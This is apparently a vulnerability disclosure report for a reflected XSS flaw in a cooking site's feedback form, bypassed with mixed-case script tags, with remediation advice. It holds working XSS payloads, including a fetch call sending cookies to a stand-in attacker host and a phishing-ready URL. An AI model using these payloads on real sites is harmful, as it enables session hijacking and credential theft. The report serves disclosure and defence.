## Title
Unauthenticated Reflected XSS Bypasses Case-Sensitive Filter Allowing Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in the website's feedback form (fname and lname parameters). The server reflects user input into the HTTP response without context-aware output encoding, and the existing <script> filter is case-sensitive, so a mixed-case <sCRipt> tag bypasses it and executes arbitrary JavaScript in a victim's browser.

## Vulnerable Endpoint
`https://cookbook.pwnedbox.site/`

## Payload Used
```
  cybrnoob'"<><sCRipt>alert(document.location)</sCRipt>
  cybrnoob'"<><sCRipt>cosole.error(document.location)</sCRipt>
  cybrnoob'"<><sCRipt>fetch('https://attacker.tld/steal?c='+document.cookie)</sCRipt>
```
## POC / Steps to Reproduce
1. Interact with the text box at `https://cookbook.pwnedbox.site/` and observe whether the input `cybrnoob'"<>` is reflected in the source.
    <img width="756" height="491" alt="SCR-20261122-lhiq" src="https://github.com/user-attachments/assets/35cba0f9-c268-4b89-8122-91efd507445d" />
2. Inject the javascript in the text box to see if it is executed.
   - Here it can be seen that the `<script>` tag is being filtered.
    <img width="756" height="491" alt="SCR-20261123-bvub" src="https://github.com/user-attachments/assets/294804dc-af48-441e-a820-5d670c5ac65a" />
    <img width="756" height="491" alt="SCR-20261123-bvyo" src="https://github.com/user-attachments/assets/ea236ad0-11ad-4ab9-b4ba-2cddadda0ea0" />
3. Verify whether filtering mechanism is case agnostic with a combination of uppercase and lowercase version of the tag.
    - For example:
      ```
      <Script>
      <sCRipt>
      ...
      ```
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
     <img width="756" height="491" alt="SCR-20261123-bpuc" src="https://github.com/user-attachments/assets/35cae75b-ebbd-4704-b9ef-34d7328ed9bc" />
      <img width="756" height="491" alt="SCR-20261123-bpih" src="https://github.com/user-attachments/assets/5fea9748-03c8-40ba-b06f-5ecab50e4b20" />
3. Craft a weaponized URL (e.g., `https://cookbook.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat fname and lname as untrusted.
2. Sanitize the input and remove HTML tags server-side instead of relying on a case-sensitive blocklist.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library, add a restrictive Content Security Policy, and set HttpOnly and SameSite on session cookies as defense in depth.
